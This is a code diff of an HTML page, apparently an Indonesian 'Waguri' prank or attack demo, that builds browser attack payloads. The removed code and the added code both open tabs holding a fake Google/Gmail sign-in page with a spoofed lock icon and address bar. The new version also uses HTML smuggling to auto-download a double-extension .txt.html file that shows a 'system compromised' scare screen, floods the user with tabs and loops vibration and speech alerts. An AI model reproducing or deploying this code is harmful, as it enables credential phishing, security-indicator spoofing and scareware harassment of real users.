@@ -3,160 +3,226 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Blob URL Security Spoofing</title>
+<title>Chaining: Smuggling + Security Spoofing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; text-align: center; border: 1px solid #333; }
-h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
-p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
-button { width: 100%; padding: 18px; cursor: pointer; border: none; border-radius: 8px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); transition: background 0.2s; }
+body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
+.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
+:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
+:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
+h2 { margin-bottom: 10px; }
+p { margin-bottom: 15px; line-height: 1.5; }
+button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
 button:hover { background: #b71c1c; }
-button:disabled { background: #555; cursor: not-allowed; }
-#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; }
+#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
+#downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
+#downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>⚠️ SYSTEM ALERT</h1>
-    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Blob URL Spoofing).</p>
-    
-    <button id="start-btn" type="button">Mulai Pemindaian</button>
-    
-    <div id="status" role="status">Menunggu interaksi...</div>
+<h2>Generator Berkas Blob &amp; ObjectURL</h2>
+<p>Klik tombol untuk mengunduh file .txt.html yang saat dibuka akan memicu Security Spoofing + Pop-up Flooding.</p>
+
+<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
+
+<div id="status" role="status">Sistem siap.</div>
+<div id="downloads"></div>
 </div>
 
 <script>
 const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
+const downloadsDiv = document.getElementById("downloads");
 
+let activeUrls = [];
 let isProcessing = false;
 
-function efekHacker() {
-    if (navigator.vibrate) {
-        navigator.vibrate([1000, 200, 1000, 200, 1000]);
-    }
+const speak = (message) => {
     if ('speechSynthesis' in window) {
         window.speechSynthesis.cancel();
-        const utterance = new SpeechSynthesisUtterance('Hacked by Waguri');
-        utterance.lang = 'en-US';
-        utterance.rate = 0.9;
+        const utterance = new SpeechSynthesisUtterance(message);
+        utterance.lang = 'id-ID';
+        utterance.rate = 1.0;
         window.speechSynthesis.speak(utterance);
     }
-}
+};
 
-// PAYLOAD HTML UNTUK BLOB
-const payloadHTML = `
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Google</title>
-    <link rel="icon" href="https://www.google.com/favicon.ico">
-    <style>
-        body { margin:0; padding:0; background:#fff; font-family:Arial, sans-serif; }
-        .address-bar { background:#e8eaed; padding:10px 15px; display:flex; align-items:center; border-bottom:1px solid #dadce0; }
-        .url-box { background:#fff; border-radius:20px; padding:8px 15px; display:flex; align-items:center; width:100%; box-shadow:0 1px 3px rgba(0,0,0,0.1); }
-        .lock-icon { color:#5f6368; margin-right:10px; font-size:16px; }
-        .url-text { color:#202124; font-size:14px; font-weight:bold; }
-        .content { display:flex; align-items:center; justify-content:center; height:calc(100vh - 60px); text-align:center; }
-        .login-box { width:100%; max-width:400px; padding:20px; }
-        .google-logo { width:200px; margin-bottom:20px; }
-        h2 { font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124; }
-        p { font-size:14px; color:#5f6368; margin-bottom:30px; }
-        input { width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none; }
-        button { width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer; }
-        .warning { color:#f00; font-size:10px; margin-top:20px; }
-    </style>
-</head>
-<body>
-    <!-- FAKE ADDRESS BAR -->
-    <div class="address-bar">
-        <div class="url-box">
-            <span class="lock-icon">🔒</span>
-            <span class="url-text">https://accounts.google.com/signin</span>
-        </div>
-    </div>
+const prepareMimeBlobAsync = (i) => {
+    return new Promise((resolve) => {
+        queueMicrotask(() => {
+            // PAYLOAD HTML SMUGGLING DENGAN CHAINING SPOOFING
+            const payloadText = "<!DOCTYPE html>" +
+            "<html>" +
+            "<head><meta charset='UTF-8'><title>SYSTEM ALERT</title></head>" +
+            "<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
+            "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
+            "<h1 style='font-size:70px;color:#f00;text-shadow:0 0 30px #f00;letter-spacing:8px;animation:pulse 0.5s infinite'>SYSTEM ALERT</h1>" +
+            "<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
+            "<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
+            "<p style='font-size:14px;color:#ff0;margin-top:20px;font-weight:bold;' id='status'>Click anywhere to start the scan.</p>" +
+            "</div>" +
+            "<style>" +
+            "@keyframes pulse { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:0.5; transform:scale(1.05); } }" +
+            "body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.05) 0px, rgba(0,255,0,0.05) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
+            "</style>" +
+            "<script>" +
+            "(function(){" +
+            "\"use strict\";" +
 
-    <!-- FAKE LOGIN FORM -->
-    <div class="content">
-        <div class="login-box">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="google-logo">
-            <h2>Sign in</h2>
-            <p>to continue to Gmail</p>
-            <input type="email" placeholder="Email or phone">
-            <input type="password" placeholder="Password">
-            <button>Next</button>
-            <p class="warning">Blob URL Spoofed by Waguri</p>
-        </div>
-    </div>
-</body>
-</html>
-`;
+            "var sudah = false;" +
+            "var targetTab = 5;" + // Jumlah tab yang dibuka
+            "var dipicu = 0;" +
 
-// Membuat Blob dari Payload
-const blob = new Blob([payloadHTML], { type: 'text/html' });
-const blobURL = URL.createObjectURL(blob);
-
-startBtn.addEventListener("click", function() {
-    if (isProcessing) return;
-    isProcessing = true;
-    startBtn.disabled = true;
-    startBtn.textContent = "Sistem Terkunci...";
-
-    efekHacker();
-
-    let dipicu = 0;
-    statusDiv.textContent = "Memicu Blob URL Spoofing...";
-
-    function picuTerusMenerus() {
-        dipicu++;
-        try {
-            // Buka tab baru langsung menuju Blob URL
-            const w = window.open(blobURL, '_blank');
+            // FUNGSI UNTUK MEMBUAT TAB SPOOFING
+            "function buatTabSpoofing(){" +
+            "    try {" +
+            "        var w = window.open('about:blank', '_blank');" +
+            "        if (w) {" +
             
-            if (w) {
-                try {
-                    // Berikan sedikit waktu untuk memuat Blob, lalu coba spoof URL bar
-                    setTimeout(() => {
-                        try {
-                            w.history.replaceState({}, '', 'https://google.com');
-                        } catch(e) {}
-                    }, 100);
+            // 1. TITLE BAR & FAVICON SPOOFING
+            "            w.document.title = 'Google';" +
+            "            var link = w.document.createElement('link');" +
+            "            link.rel = 'icon';" +
+            "            link.href = 'https://www.google.com/favicon.ico';" +
+            "            w.document.head.appendChild(link);" +
 
-                    // 5. GETAR & TTS BERULANG DI TAB BARU
-                    w.addEventListener('load', function() {
-                        try {
-                            w.eval(`
-                                if (navigator.vibrate) {
-                                    setInterval(function() {
-                                        navigator.vibrate([1000, 500, 1000]);
-                                    }, 2500);
-                                }
-                                if ('speechSynthesis' in window) {
-                                    setInterval(function() {
-                                        var msg = new SpeechSynthesisUtterance('System compromised');
-                                        msg.lang = 'en-US';
-                                        window.speechSynthesis.speak(msg);
-                                    }, 4000);
-                                }
-                            `);
-                        } catch(e) {}
-                    });
+            // 2. HISTORY API SPOOFING
+            "            try { w.history.replaceState({}, '', 'https://accounts.google.com/signin'); } catch(e) {}" +
 
-                } catch(e) {}
-            }
-            statusDiv.textContent = `Membuka tab Blob ke-${dipicu}...`;
-        } catch(e) {}
+            // 3. SECURITY INDICATOR SPOOFING (UI PALSU)
+            "            w.document.body.style.margin = '0';" +
+            "            w.document.body.style.padding = '0';" +
+            "            w.document.body.style.background = '#fff';" +
+            "            w.document.body.style.fontFamily = 'Arial, sans-serif';" +
+            "            w.document.body.innerHTML = `" +
+            "                <div style='background:#e8eaed; padding:10px 15px; display:flex; align-items:center; border-bottom:1px solid #dadce0;'>" +
+            "                    <div style='background:#fff; border-radius:20px; padding:8px 15px; display:flex; align-items:center; width:100%; box-shadow:0 1px 3px rgba(0,0,0,0.1);'>" +
+            "                        <span style='color:#5f6368; margin-right:10px; font-size:16px;'>🔒</span>" +
+            "                        <span style='color:#202124; font-size:14px; font-weight:bold;'>https://accounts.google.com/signin</span>" +
+            "                    </div>" +
+            "                </div>" +
+            "                <div style='display:flex; align-items:center; justify-content:center; height:calc(100vh - 60px); text-align:center; background:#fff;'>" +
+            "                    <div style='width:100%; max-width:400px; padding:20px;'>" +
+            "                        <img src='https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png' style='width:200px; margin-bottom:20px;'>" +
+            "                        <h2 style='font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124;'>Sign in</h2>" +
+            "                        <p style='font-size:14px; color:#5f6368; margin-bottom:30px;'>to continue to Gmail</p>" +
+            "                        <input type='email' placeholder='Email or phone' style='width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;'>" +
+            "                        <input type='password' placeholder='Password' style='width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;'>" +
+            "                        <button style='width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;'>Next</button>" +
+            "                        <p style='color:#f00; font-size:10px; margin-top:20px;'>Spoofed by Waguri</p>" +
+            "                    </div>" +
+            "                </div>" +
+            "            `;" +
 
-        queueMicrotask(picuTerusMenerus);
-    }
+            // 4. GETAR & TTS DI DALAM TAB BARU
+            "            w.eval(`" +
+            "                if (navigator.vibrate) { setInterval(function() { navigator.vibrate([500, 200, 500]); }, 2000); }" +
+            "                if ('speechSynthesis' in window) { setInterval(function() { var msg = new SpeechSynthesisUtterance('System compromised'); msg.lang = 'en-US'; window.speechSynthesis.speak(msg); }, 3000); }" +
+            "            `);" +
+            "        }" +
+            "    } catch(e) {}" +
+            "}" +
 
-    queueMicrotask(function() {
-        queueMicrotask(function() {
-            picuTerusMenerus();
+            // FUNGSI RACE CONDITION
+            "function picuSatu(){" +
+            "    if (dipicu >= targetTab) return;" +
+            "    dipicu++;" +
+            "    document.getElementById('status').textContent = 'Membuka tab ke-' + dipicu + ' dari ' + targetTab;" +
+            "    buatTabSpoofing();" +
+            "    setTimeout(picuSatu, 300);" + // Jeda 300ms antar tab
+            "}" +
+
+            "function mulai(){" +
+            "    if(sudah) return;" +
+            "    sudah = true;" +
+            "    document.getElementById('status').textContent = 'Memicu Race Condition...';" +
+            "    setTimeout(picuSatu, 500);" +
+            "}" +
+
+            // TRIGGER UTAMA
+            "document.addEventListener('click', mulai);" +
+            "document.addEventListener('touchstart', mulai);" +
+            "window.addEventListener('load', function(){ setTimeout(mulai, 1000); });" +
+
+            "})();" +
+            "<\/script>" +
+            "</body>" +
+            "</html>";
+          
+            const blob = new Blob([payloadText], { type: "text/html" });
+            const url = URL.createObjectURL(blob);
+            resolve({ id: i, url: url });
         });
     });
+};
+
+const triggerInstantDownload = (fileData) => {
+    const link = document.createElement("a");
+    link.href = fileData.url;
+    
+    // Ekstensi ganda .txt.html untuk MIME Sniffing
+    link.download = `waguri-spoof-${fileData.id}.txt.html`;
+    
+    link.textContent = `Download waguri-spoof.txt.html`;
+    link.style.display = "none";
+    downloadsDiv.appendChild(link);
+    link.click();
+};
+
+const processLoop = async (counter) => {
+    if (!isProcessing) return;
+
+    const fileData = await prepareMimeBlobAsync(counter);
+    activeUrls.push(fileData.url);
+
+    triggerInstantDownload(fileData);
+
+    statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
+
+    if (counter % 10 === 0) {
+        speak(`Proses mencapai ${counter} berkas.`);
+    }
+
+    // Hentikan di 1 file agar tidak spam
+    if (counter >= 1) {
+        isProcessing = false;
+        startBtn.disabled = false;
+        return;
+    }
+
+    setTimeout(() => processLoop(counter + 1), 0);
+};
+
+startBtn.addEventListener("click", () => {
+    if (isProcessing) return;
+
+    activeUrls.forEach(url => URL.revokeObjectURL(url));
+    activeUrls = [];
+    downloadsDiv.replaceChildren();
+
+    speak("Mengaktifkan mode layar penuh.");
+
+    const root = document.documentElement;
+    try {
+        if (root.requestFullscreen) {
+            root.requestFullscreen();
+        } else if (root.webkitRequestFullscreen) {
+            root.webkitRequestFullscreen();
+        } else if (root.mozRequestFullScreen) {
+            root.mozRequestFullScreen();
+        }
+        statusDiv.textContent = "Mengunci layar penuh...";
+    } catch (err) {
+        console.warn("Fullscreen tidak didukung atau ditolak:", err);
+    }
+
+    setTimeout(() => {
+        isProcessing = true;
+        speak("Proses pembuatan berkas Blob dimulai.");
+        processLoop(1);
+    }, 300);
 });
 </script>
 </body>
